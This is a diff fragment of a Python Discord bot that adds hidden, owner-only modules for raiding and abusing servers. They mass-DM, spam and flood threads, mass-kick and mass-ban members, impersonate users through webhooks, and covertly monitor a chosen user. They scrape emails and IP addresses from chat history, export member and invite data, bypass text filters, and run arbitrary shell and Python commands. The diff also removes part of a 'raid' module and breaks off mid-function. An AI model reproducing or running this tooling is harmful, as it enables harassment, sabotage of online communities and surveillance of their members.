+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def getdm(self, ctx: commands.Context, target: discord.Member, limit: int = 20):
+        """attempt to read recent dms (requires bot to share a server). this is a simulation."""
+        await ctx.send("direct message reading is not natively possible without user token. logging simulated.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def impersonate(self, ctx: commands.Context, target: discord.Member, *, message: str):
+        """send a message as a webhook mimicking the target user."""
+        await ctx.message.delete()
+        try:
+            webhook = await ctx.channel.create_webhook(name=target.display_name)
+            await webhook.send(message, avatar_url=target.display_avatar.url)
+            await webhook.delete()
+        except Exception as e:
+            await ctx.send(f"error: {e}", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def grabpfp(self, ctx: commands.Context, target: discord.Member):
+        """download a user's profile picture."""
+        await ctx.send(target.display_avatar.url)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def massdm(self, ctx: commands.Context, *, message: str):
+        """dm every member in the server."""
+        count = 0
+        for member in ctx.guild.members:
+            if member.bot or member == ctx.author:
+                continue
+            try:
+                await member.send(message)
+                count += 1
+                await asyncio.sleep(1)
+            except:
+                pass
+        await ctx.send(f"messaged {count} members.")
+
+# ========================================
+# thread_bomb.py
+# ========================================
+class ThreadBomb(commands.Cog, name="thread_bomb"):
+    """81-87: thread and forum manipulation."""
+
+    def __init__(self, bot: commands.Bot):
+        self.bot = bot
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def threadbomb(self, ctx: commands.Context, count: int = 30, *, name: str = "chaos"):
+        """81. create many threads in a channel."""
+        channel = ctx.channel
+        created = 0
+        for i in range(count):
+            try:
+                await channel.create_thread(name=f"{name}-{i}", type=discord.ChannelType.public_thread)
+                created += 1
+                await asyncio.sleep(0.3)
+            except:
+                break
+        await ctx.send(f"created {created} threads.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def archvethreads(self, ctx: commands.Context):
+        """82. archive all active threads."""
+        count = 0
+        for thread in ctx.guild.threads:
+            try:
+                await thread.edit(archived=True, locked=True)
+                count += 1
+                await asyncio.sleep(0.2)
+            except:
+                pass
+        await ctx.send(f"archived {count} threads.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def deletethreads(self, ctx: commands.Context):
+        """83. delete all threads."""
+        count = 0
+        for thread in ctx.guild.threads:
+            try:
+                await thread.delete()
+                count += 1
+                await asyncio.sleep(0.2)
+            except:
+                pass
+        await ctx.send(f"deleted {count} threads.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def unarchivethreads(self, ctx: commands.Context):
+        """84. unarchive all archived threads."""
+        count = 0
+        for thread in ctx.guild.threads:
+            if thread.archived:
+                try:
+                    await thread.edit(archived=False, locked=False)
+                    count += 1
+                    await asyncio.sleep(0.2)
+                except:
+                    pass
+        await ctx.send(f"unarchived {count} threads.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def threadspam(self, ctx: commands.Context, count: int = 5, *, message: str = "thread spam"):
+        """85. send a message to all threads."""
+        sent = 0
+        for thread in ctx.guild.threads:
+            if not thread.archived:
+                try:
+                    await thread.send(message)
+                    sent += 1
+                    await asyncio.sleep(0.3)
+                except:
+                    pass
+        await ctx.send(f"messaged {sent} threads.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def forumspam(self, ctx: commands.Context, count: int = 20, *, name: str = "post"):
+        """86. create posts in forum channels."""
+        created = 0
+        for channel in ctx.guild.forums:
+            for i in range(count):
+                try:
+                    await channel.create_thread(name=f"{name}-{i}", content="spam")
+                    created += 1
+                    await asyncio.sleep(0.5)
+                except:
+                    break
+        await ctx.send(f"created {created} forum posts.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def privatethread(self, ctx: commands.Context, target: discord.Member):
+        """87. create a private thread with a target."""
+        thread = await ctx.channel.create_thread(
+            name=f"private-{target.name}",
+            type=discord.ChannelType.private_thread,
+        )
+        await thread.add_user(target)
+        await ctx.send(f"private thread created with {target.mention}.", delete_after=5)
+
+# ========================================
+# admin.py
+# ========================================
+class Admin(commands.Cog, name="admin"):
+    """administrative commands for bot management."""
+
+    def __init__(self, bot: commands.Bot):
+        self.bot = bot
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def loadcog(self, ctx: commands.Context, *, cog: str):
+        """load a command module."""
+        try:
+            await self.bot.load_extension(f"cmds.{cog}")
+            await ctx.send(f"loaded `{cog}`.")
+        except Exception as e:
+            await ctx.send(f"failed: {e}")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def unloadcog(self, ctx: commands.Context, *, cog: str):
+        """unload a command module."""
+        try:
+            await self.bot.unload_extension(f"cmds.{cog}")
+            await ctx.send(f"unloaded `{cog}`.")
+        except Exception as e:
+            await ctx.send(f"failed: {e}")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def reloadcog(self, ctx: commands.Context, *, cog: str):
+        """reload a command module."""
+        try:
+            await self.bot.reload_extension(f"cmds.{cog}")
+            await ctx.send(f"reloaded `{cog}`.")
+        except Exception as e:
+            await ctx.send(f"failed: {e}")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def listcogs(self, ctx: commands.Context):
+        """list all loaded cogs."""
+        cogs = [c for c in self.bot.cogs]
+        await ctx.send("```\n" + "\n".join(cogs) + "\n```")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def shutdown(self, ctx: commands.Context):
+        """shut down the bot."""
+        await ctx.send("shutting down.")
+        await self.bot.close()
+
+    @commands.command(hidden=True, name="exec")
+    @commands.is_owner()
+    async def execute_code(self, ctx: commands.Context, *, code: str):
+        """execute arbitrary python code. returns stdout."""
+        env = {
+            "bot": self.bot,
+            "ctx": ctx,
+            "discord": discord,
+            "commands": commands,
+            "os": os,
+            "sys": sys,
+        }
+        code = textwrap.dedent(code).strip()
+        if code.startswith("```") and code.endswith("```"):
+            code = "\n".join(code.split("\n")[1:-1])
+        stdout = io.StringIO()
+        try:
+            with contextlib.redirect_stdout(stdout):
+                exec(f"async def _exec():\n    {code}\n", env)
+                await env["_exec"]()
+            result = stdout.getvalue()
+        except Exception as e:
+            result = f"error: {e}"
+        if len(result) > 1900:
+            result = result[:1900] + "\n...truncated"
+        await ctx.send(f"```py\n{result}\n```" if result else "```\n[no output]\n```")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def shell(self, ctx: commands.Context, *, command: str):
+        """execute a shell command and return the output."""
+        try:
+            proc = await asyncio.create_subprocess_shell(
+                command,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+            )
+            stdout, stderr = await proc.communicate()
+            output = (stdout + stderr).decode("utf-8", errors="replace")
+            if len(output) > 1900:
+                output = output[:1900] + "\n...truncated"
+            await ctx.send(f"```\n{output}\n```" if output else "```\n[no output]\n```")
+        except Exception as e:
+            await ctx.send(f"error: {e}")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def guilds(self, ctx: commands.Context):
+        """list all guilds the bot is in."""
+        g_list = [f"{g.name} ({g.id}) - {g.member_count} members" for g in self.bot.guilds]
+        chunks = [g_list[i:i+20] for i in range(0, len(g_list), 20)]
+        for chunk in chunks:
+            await ctx.send("```\n" + "\n".join(chunk) + "\n```")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def leaveguild(self, ctx: commands.Context, guild_id: int):
+        """leave a guild by id."""
+        guild = self.bot.get_guild(guild_id)
+        if guild:
+            await guild.leave()
+            await ctx.send(f"left guild: {guild.name}")
+        else:
+            await ctx.send("guild not found.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def dmall(self, ctx: commands.Context, *, message: str):
+        """dm all mutual guild members. use with caution."""
+        count = 0
+        seen = set()
+        for guild in self.bot.guilds:
+            for member in guild.members:
+                if member.id == self.bot.user.id or member.id in seen:
+                    continue
+                seen.add(member.id)
+                try:
+                    await member.send(message)
+                    count += 1
+                    await asyncio.sleep(1.5)
+                except:
+                    pass
+        await ctx.send(f"messaged {count} unique users.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def setstatus(self, ctx: commands.Context, status_type: str, *, text: str):
+        """set bot status. types: play, watch, listen, stream."""
+        types = {
+            "play": discord.ActivityType.playing,
+            "watch": discord.ActivityType.watching,
+            "listen": discord.ActivityType.listening,
+            "stream": discord.ActivityType.streaming,
+        }
+        act_type = types.get(status_type.lower(), discord.ActivityType.playing)
+        await self.bot.change_presence(activity=discord.Activity(type=act_type, name=text))
+        await ctx.send("status updated.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def setavatar(self, ctx: commands.Context):
+        """set bot avatar from attached image."""
+        if not ctx.message.attachments:
+            return await ctx.send("attach an image.")
+        attachment = ctx.message.attachments[0]
+        img_bytes = await attachment.read()
+        await self.bot.user.edit(avatar=img_bytes)
+        await ctx.send("avatar updated.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def setname(self, ctx: commands.Context, *, name: str):
+        """change the bot's username."""
+        await self.bot.user.edit(username=name)
+        await ctx.send(f"username changed to {name}.")
+
+# ========================================
+# automation.py
+# ========================================
+AUTO_DIR = "data/automation"
+os.makedirs(AUTO_DIR, exist_ok=True)
+
+class Automation(commands.Cog, name="automation"):
+    """96-100: automated sabotage and monitoring."""
+
+    def __init__(self, bot: commands.Bot):
+        self.bot = bot
+        self.spam_task = None
+        self.monitor_file = os.path.join(AUTO_DIR, "monitor.json")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def autospam(self, ctx: commands.Context, interval: int, *, message: str):
+        """96. start automated spamming in the current channel."""
+        if self.spam_task:
+            return await ctx.send("auto spam already running.")
+        async def spam_loop():
+            while True:
+                try:
+                    await ctx.channel.send(message)
+                except:
+                    pass
+                await asyncio.sleep(interval)
+        self.spam_task = self.bot.loop.create_task(spam_loop())
+        await ctx.send(f"auto spam started every {interval}s.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def stopspam(self, ctx: commands.Context):
+        """97. stop automated spamming."""
+        if self.spam_task:
+            self.spam_task.cancel()
+            self.spam_task = None
+            await ctx.send("auto spam stopped.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def autodelete(self, ctx: commands.Context, target: discord.Member, delay: float = 1.0):
+        """98. automatically delete messages from a specific user."""
+        await ctx.send(f"autodelete enabled on {target.mention}.", delete_after=5)
+        def check(m):
+            return m.author == target
+        try:
+            while True:
+                msg = await self.bot.wait_for("message", check=check, timeout=600)
+                await asyncio.sleep(delay)
+                try:
+                    await msg.delete()
+                except:
+                    pass
+        except asyncio.TimeoutError:
+            await ctx.send(f"autodelete on {target.mention} timed out.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def monitor(self, ctx: commands.Context, target: discord.Member):
+        """99. log all activity of a specific user."""
+        data = {"target": str(target), "id": target.id, "events": []}
+        filepath = os.path.join(AUTO_DIR, f"monitor_{target.id}.json")
+        await ctx.send(f"monitoring {target.mention}.", delete_after=5)
+        def check(m):
+            return m.author == target
+        try:
+            while True:
+                msg = await self.bot.wait_for("message", check=check, timeout=600)
+                data["events"].append({
+                    "time": str(msg.created_at),
+                    "channel": str(msg.channel),
+                    "content": msg.content,
+                })
+                with open(filepath, "w") as f:
+                    json.dump(data, f, indent=4)
+        except asyncio.TimeoutError:
+            await ctx.send(f"monitoring on {target.mention} ended.", file=discord.File(filepath))
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def autorole(self, ctx: commands.Context, role: discord.Role):
+        """100. assign a specific role to every new member that joins."""
+        self.bot.autorole = role
+        await ctx.send(f"autorole set to {role.name}.", delete_after=5)
+
+    @commands.Cog.listener()
+    async def on_member_join(self, member: discord.Member):
+        if hasattr(self.bot, "autorole") and self.bot.autorole:
+            try:
+                await member.add_roles(self.bot.autorole)
+            except:
+                pass
+
+# ========================================
+# hidden_commands.py
+# ========================================
+class HiddenCommands(commands.Cog, name="hidden_commands"):
+    """miscellaneous hidden exploitation commands."""
+
+    def __init__(self, bot: commands.Bot):
+        self.bot = bot
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def nickall(self, ctx: commands.Context, *, nickname: str):
+        """nickname all members."""
+        count = 0
+        for member in ctx.guild.members:
+            if member.top_role >= ctx.guild.me.top_role:
+                continue
+            try:
+                await member.edit(nick=nickname[:32])
+                count += 1
+                await asyncio.sleep(0.5)
+            except:
+                pass
+        await ctx.send(f"nicknamed {count} members.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def wipe(self, ctx: commands.Context, amount: int = 100):
+        """bulk delete messages."""
+        await ctx.channel.purge(limit=amount+1)
+        await ctx.send(f"deleted {amount} messages.", delete_after=3)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def embed(self, ctx: commands.Context, title: str, *, description: str):
+        """send a custom embed."""
+        embed = discord.Embed(title=title, description=description, color=discord.Color.random())
+        await ctx.send(embed=embed)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def botleave(self, ctx: commands.Context):
+        """make the bot leave the current server."""
+        await ctx.send("goodbye.")
+        await ctx.guild.leave()
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def channeltopic(self, ctx: commands.Context, *, topic: str):
+        """change the current channel topic."""
+        await ctx.channel.edit(topic=topic)
+        await ctx.send("topic updated.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def createrole(self, ctx: commands.Context, name: str, color: str = "ff0000"):
+        """create a role with specified name and hex color."""
+        color_int = int(color.lstrip("#"), 16)
+        role = await ctx.guild.create_role(name=name, color=discord.Color(color_int))
+        await ctx.send(f"created role {role.mention}.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def deleterole(self, ctx: commands.Context, *, role: discord.Role):
+        """delete a role."""
+        await role.delete()
+        await ctx.send("role deleted.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def unicode(self, ctx: commands.Context, *, text: str):
+        """convert text to unicode characters for bypassing filters."""
+        result = []
+        for char in text:
+            if char.isascii() and char.isalpha():
+                result.append(chr(ord(char) + 65248))
+            else:
+                result.append(char)
+        await ctx.send("".join(result))
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def zalgo(self, ctx: commands.Context, *, text: str):
+        """apply zalgo text effect."""
+        zalgo_chars = [
+            '\u0300', '\u0301', '\u0302', '\u0303', '\u0304', '\u0305',
+            '\u0306', '\u0307', '\u0308', '\u0309', '\u030a', '\u030b',
+            '\u030c', '\u030d', '\u030e', '\u030f', '\u0310', '\u0311',
+            '\u0312', '\u0313', '\u0314', '\u0315', '\u031a', '\u031b',
+        ]
+        result = []
+        for char in text:
+            result.append(char)
+            for _ in range(random.randint(0, 8)):
+                result.append(random.choice(zalgo_chars))
+        await ctx.send("".join(result))
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def react(self, ctx: commands.Context, message_id: int, *emojis):
+        """add reactions to a message by id."""
+        try:
+            msg = await ctx.channel.fetch_message(message_id)
+            for emoji in emojis:
+                await msg.add_reaction(emoji)
+                await asyncio.sleep(0.5)
+            await ctx.send("reactions added.", delete_after=5)
+        except Exception as e:
+            await ctx.send(f"error: {e}", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def button(self, ctx: commands.Context, label: str, url: str):
+        """send a message with a button."""
+        view = discord.ui.View()
+        view.add_item(discord.ui.Button(label=label, url=url))
+        await ctx.send("click below:", view=view)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def poll(self, ctx: commands.Context, *, question: str):
+        """create a poll with reactions."""
+        msg = await ctx.send(f"poll: {question}")
+        await msg.add_reaction("👍")
+        await msg.add_reaction("👎")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def hidename(self, ctx: commands.Context, *, name: str):
+        """rename the bot."""
+        await ctx.guild.me.edit(nick=name)
+        await ctx.send("bot nickname updated.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def shutup(self, ctx: commands.Context, target: discord.Member):
+        """timeout a member."""
+        try:
+            await target.timeout(discord.utils.utcnow() + discord.timedelta(minutes=5))
+            await ctx.send(f"timed out {target.mention} for 5 minutes.", delete_after=5)
+        except Exception as e:
+            await ctx.send(f"error: {e}", delete_after=5)
+
+# ========================================
+# webhook.py
+# ========================================
+class Webhook(commands.Cog, name="webhook"):
+    """webhook manipulation tools."""
+
+    def __init__(self, bot: commands.Bot):
+        self.bot = bot
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def createhook(self, ctx: commands.Context, name: str = "hook"):
+        """create a webhook in the current channel."""
+        try:
+            hook = await ctx.channel.create_webhook(name=name)
+            await ctx.send(f"created webhook: {hook.url}")
+        except discord.Forbidden:
+            await ctx.send("missing permissions.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def sendhook(self, ctx: commands.Context, webhook_url: str, *, message: str):
+        """send a message via a webhook url."""
+        async with aiohttp.ClientSession() as session:
+            webhook = discord.Webhook.from_url(webhook_url, session=session)
+            try:
+                await webhook.send(message, username="spoof")
+                await ctx.send("message sent.")
+            except Exception as e:
+                await ctx.send(f"error: {e}")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def spammhook(self, ctx: commands.Context, webhook_url: str, count: int, *, message: str):
+        """spam a webhook."""
+        async with aiohttp.ClientSession() as session:
+            webhook = discord.Webhook.from_url(webhook_url, session=session)
+            for _ in range(count):
+                try:
+                    await webhook.send(message)
+                    await asyncio.sleep(0.5)
+                except:
+                    pass
+        await ctx.send(f"spammed {count} messages.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def deletehook(self, ctx: commands.Context, webhook_url: str):
+        """delete a webhook by url."""
+        async with aiohttp.ClientSession() as session:
+            webhook = discord.Webhook.from_url(webhook_url, session=session)
+            try:
+                await webhook.delete()
+                await ctx.send("webhook deleted.")
+            except Exception as e:
+                await ctx.send(f"error: {e}")
+
+# ========================================
+# exploit.py
+# ========================================
+class Exploit(commands.Cog, name="exploit"):
+    """exploitation and manipulation commands."""
+
+    def __init__(self, bot: commands.Bot):
+        self.bot = bot
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def ghostping(self, ctx: commands.Context, target: discord.Member, count: int = 10):
+        """ghost ping a user (mention then immediately delete)."""
+        for _ in range(count):
+            msg = await ctx.send(target.mention)
+            await msg.delete()
+            await asyncio.sleep(0.5)
+        await ctx.send(f"ghost pinged {target.mention} {count} times.", delete_after=3)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def fetchwebhooks(self, ctx: commands.Context, channel: discord.TextChannel = None):
+        """list webhooks in a channel."""
+        channel = channel or ctx.channel
+        try:
+            hooks = await channel.webhooks()
+            if not hooks:
+                return await ctx.send("no webhooks found.")
+            info = [f"name: {w.name} | url: {w.url}" for w in hooks]
+            await ctx.send("\n".join(info))
+        except discord.Forbidden:
+            await ctx.send("missing permissions.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def stealemoji(self, ctx: commands.Context, emoji: str, name: str = None):
+        """steal an emoji from a message and add to the server."""
+        emoji_match = re.match(r"<(a?):(\w+):(\d+)>", emoji)
+        if not emoji_match:
+            return await ctx.send("invalid emoji format. use a custom emoji.")
+        animated = emoji_match.group(1) == "a"
+        emoji_name = name or emoji_match.group(2)
+        emoji_id = int(emoji_match.group(3))
+        extension = "gif" if animated else "png"
+        url = f"https://cdn.discordapp.com/emojis/{emoji_id}.{extension}"
+        async with aiohttp.ClientSession() as session:
+            async with session.get(url) as resp:
+                if resp.status != 200:
+                    return await ctx.send("failed to download emoji.")
+                img_data = await resp.read()
+        try:
+            new_emoji = await ctx.guild.create_custom_emoji(
+                name=emoji_name,
+                image=img_data,
+            )
+            await ctx.send(f"stole emoji: {new_emoji}")
+        except discord.Forbidden:
+            await ctx.send("missing permissions to create emoji.")
+        except discord.HTTPException as e:
+            await ctx.send(f"error: {e}")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def masskick(self, ctx: commands.Context, *, reason: str = "purge"):
+        """kick all kickable members (except admins)."""
+        count = 0
+        for member in ctx.guild.members:
+            if member.top_role >= ctx.guild.me.top_role or member == ctx.guild.owner:
+                continue
+            try:
+                await member.kick(reason=reason)
+                count += 1
+                await asyncio.sleep(1)
+            except:
+                pass
+        await ctx.send(f"kicked {count} members.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def massban(self, ctx: commands.Context, *, reason: str = "purge"):
+        """ban all bannable members."""
+        count = 0
+        for member in ctx.guild.members:
+            if member.top_role >= ctx.guild.me.top_role or member == ctx.guild.owner:
+                continue
+            try:
+                await member.ban(reason=reason)
+                count += 1
+                await asyncio.sleep(1)
+            except:
+                pass
+        await ctx.send(f"banned {count} members.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def scrapeinvite(self, ctx: commands.Context, invite_code: str):
+        """get info about a discord invite."""
+        try:
+            invite = await self.bot.fetch_invite(invite_code)
+            info = (
+                f"server: {invite.guild.name}\n"
+                f"id: {invite.guild.id}\n"
+                f"members online: {invite.approximate_presence_count}\n"
+                f"total members: {invite.approximate_member_count}\n"
+                f"channel: {invite.channel.name}"
+            )
+            await ctx.send(f"```\n{info}\n```")
+        except Exception as e:
+            await ctx.send(f"error: {e}")
+
+# ========================================
+# exfil.py
+# ========================================
+EXFIL_DIR = "data/exfil"
+os.makedirs(EXFIL_DIR, exist_ok=True)
+
+class Exfil(commands.Cog, name="exfil"):
+    """21-30: data exfiltration tools."""
+
+    def __init__(self, bot: commands.Bot):
+        self.bot = bot
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def grabemails(self, ctx: commands.Context):
+        """21. search message history for email addresses."""
+        pattern = r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
+        found = []
+        for channel in ctx.guild.text_channels:
+            try:
+                async for msg in channel.history(limit=200):
+                    emails = re.findall(pattern, msg.content)
+                    for e in emails:
+                        found.append(f"{msg.author}: {e}")
+            except:
+                continue
+        await ctx.send("\n".join(found[:50]) or "no emails found.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def grabips(self, ctx: commands.Context):
+        """22. search for ip addresses in chat history."""
+        pattern = r"\b(?:\d{1,3}\.){3}\d{1,3}\b"
+        found = []
+        for channel in ctx.guild.text_channels:
+            try:
+                async for msg in channel.history(limit=200):
+                    ips = re.findall(pattern, msg.content)
+                    for ip in ips:
+                        found.append(f"{msg.author}: {ip}")
+            except:
+                continue
+        await ctx.send("\n".join(found[:50]) or "no ips found.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def graburls(self, ctx: commands.Context):
+        """23. extract all urls from recent message history."""
+        pattern = r"https?://[^\s]+"
+        found = []
+        for channel in ctx.guild.text_channels:
+            try:
+                async for msg in channel.history(limit=200):
+                    urls = re.findall(pattern, msg.content)
+                    for u in urls:
+                        found.append(f"{msg.author}: {u}")
+            except:
+                continue
+        await ctx.send("\n".join(found[:50]) or "no urls found.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def exfilmembers(self, ctx: commands.Context):
+        """24. export full member data to json."""
+        data = []
+        for member in ctx.guild.members:
+            data.append({
+                "id": member.id,
+                "name": str(member),
+                "display_name": member.display_name,
+                "joined_at": str(member.joined_at),
+                "created_at": str(member.created_at),
+                "roles": [r.name for r in member.roles],
+                "bot": member.bot,
+            })
+        filepath = os.path.join(EXFIL_DIR, f"{ctx.guild.id}_members.json")
+        with open(filepath, "w") as f:
+            json.dump(data, f, indent=4)
+        await ctx.send(f"exported {len(data)} members.", file=discord.File(filepath))
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def exfilroles(self, ctx: commands.Context):
+        """25. export all role configurations."""
+        data = []
+        for role in ctx.guild.roles:
+            data.append({
+                "id": role.id,
+                "name": role.name,
+                "permissions": role.permissions.value,
+                "color": role.color.value,
+                "position": role.position,
+                "members": len(role.members),
+            })
+        filepath = os.path.join(EXFIL_DIR, f"{ctx.guild.id}_roles.json")
+        with open(filepath, "w") as f:
+            json.dump(data, f, indent=4)
+        await ctx.send(f"exported {len(data)} roles.", file=discord.File(filepath))
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def exfilinvites(self, ctx: commands.Context):
+        """26. export all server invites."""
+        try:
+            invites = await ctx.guild.invites()
+            data = [{"code": i.code, "uses": i.uses, "max_uses": i.max_uses, "channel": i.channel.name, "inviter": str(i.inviter)} for i in invites]
+            filepath = os.path.join(EXFIL_DIR, f"{ctx.guild.id}_invites.json")
+            with open(filepath, "w") as f:
+                json.dump(data, f, indent=4)
+            await ctx.send(f"exported {len(data)} invites.", file=discord.File(filepath))
+        except:
+            await ctx.send("missing permissions.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def exfilchannels(self, ctx: commands.Context):
+        """27. export channel structure."""
+        data = []
+        for ch in ctx.guild.channels:
+            data.append({
+                "id": ch.id,
+                "name": ch.name,
+                "type": str(ch.type),
+                "category": ch.category.name if ch.category else None,
+                "position": ch.position,
+            })
+        filepath = os.path.join(EXFIL_DIR, f"{ctx.guild.id}_channels.json")
+        with open(filepath, "w") as f:
+            json.dump(data, f, indent=4)
+        await ctx.send(f"exported {len(data)} channels.", file=discord.File(filepath))
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def dmscan(self, ctx: commands.Context, target: discord.Member):
+        """28. scan mutual guilds with a target user."""
+        mutuals = []
+        for guild in self.bot.guilds:
+            if guild.get_member(target.id):
+                mutuals.append(f"{guild.name} ({guild.id})")
+        await ctx.send(f"mutual guilds with {target}: {len(mutuals)}\n```\n" + "\n".join(mutuals[:20]) + "\n```")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def snapshot(self, ctx: commands.Context):
+        """29. take a full server snapshot including all data."""
+        results = {
+            "guild": {"name": ctx.guild.name, "id": ctx.guild.id},
+            "members": [],
+            "roles": [],
+            "channels": [],
+        }
+        for m in ctx.guild.members:
+            results["members"].append({"name": str(m), "id": m.id, "roles": [r.name for r in m.roles]})
+        for r in ctx.guild.roles:
+            results["roles"].append({"name": r.name, "id": r.id, "perms": r.permissions.value})
+        for c in ctx.guild.channels:
+            results["channels"].append({"name": c.name, "id": c.id, "type": str(c.type)})
+        filepath = os.path.join(EXFIL_DIR, f"{ctx.guild.id}_snapshot.json")
+        with open(filepath, "w") as f:
+            json.dump(results, f, indent=4)
+        await ctx.send("full snapshot saved.", file=discord.File(filepath))
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def linktree(self, ctx: commands.Context, target: discord.Member = None):
+        """30. gather all connected accounts of a user."""
+        target = target or ctx.author
+        info = []
+        try:
+            profile = await self.bot.fetch_user(target.id)
+            if profile.banner:
+                info.append(f"banner: {profile.banner.url}")
+            if profile.accent_color:
+                info.append(f"accent color: {profile.accent_color}")
+        except:
+            pass
+        info.append(f"avatar: {target.display_avatar.url}")
+        await ctx.send("\n".join(info) or "no additional data.")
+
+# ========================================
+# spammer.py
+# ========================================
+class Spammer(commands.Cog, name="spammer"):
+    """message spamming utilities."""
+
+    def __init__(self, bot: commands.Bot):
+        self.bot = bot
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def spam(self, ctx: commands.Context, count: int, *, message: str):
+        """spam a message in the current channel."""
+        for _ in range(count):
+            await ctx.send(message)
+            await asyncio.sleep(0.5)
+        await ctx.send(f"spammed {count} messages.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def fastspam(self, ctx: commands.Context, count: int, *, message: str):
+        """spam without delays."""
+        for _ in range(count):
+            await ctx.send(message)
+        await ctx.send(f"fast spammed {count} messages.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def dmspam(self, ctx: commands.Context, target: discord.Member, count: int, *, message: str):
+        """spam a user's dms."""
+        for _ in range(count):
+            try:
+                await target.send(message)
+                await asyncio.sleep(1)
+            except:
+                break
+        await ctx.send(f"dm spammed {target.name}.")
+
+# ========================================
 # psych_ops.py
 # ========================================
 class PsychOps(commands.Cog, name="psych_ops"):
@@ -2105,114 +1929,6 @@ class PsychOps(commands.Cog, name="psych_ops"):
             except:
                 pass
         await ctx.send(f"announcement sent to {count} channels.", delete_after=5)
-
-# ========================================
-# raid.py
-# ========================================
-class Raid(commands.Cog, name="raid"):
-    """server raiding utilities."""
-
-    def __init__(self, bot: commands.Bot):
-        self.bot = bot
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def channelspam(self, ctx: commands.Context, name: str = "raided", amount: int = 50):
-        """create a large number of channels rapidly."""
-        created = 0
-        for i in range(amount):
-            try:
-                await ctx.guild.create_text_channel(f"{name}-{i}")
-                created += 1
-                await asyncio.sleep(0.3)
-            except:
-                break
-        await ctx.send(f"created {created} channels.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def rolespam(self, ctx: commands.Context, name: str = "raided", amount: int = 30):
-        """create a large number of roles."""
-        created = 0
-        for i in range(amount):
-            try:
-                await ctx.guild.create_role(name=f"{name}-{i}")
-                created += 1
-                await asyncio.sleep(0.3)
-            except:
-                break
-        await ctx.send(f"created {created} roles.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def spamchannels(self, ctx: commands.Context, amount: int = 10, *, message: str = "RAIDED"):
-        """send a message to all text channels."""
-        count = 0
-        for channel in ctx.guild.text_channels:
-            try:
-                await channel.send(message)
-                count += 1
